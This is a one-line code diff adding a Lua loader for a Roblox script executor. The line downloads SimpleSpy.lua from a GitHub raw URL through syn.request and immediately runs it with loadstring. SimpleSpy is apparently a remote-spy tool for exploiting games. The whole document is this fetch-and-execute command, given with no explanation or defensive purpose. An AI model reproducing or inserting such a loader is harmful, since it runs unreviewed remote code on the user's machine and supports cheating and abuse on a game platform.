@@ -1,0 +1,1 @@
+loadstring(syn.request({Url = "https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua", Method = "GET"}).Body)()
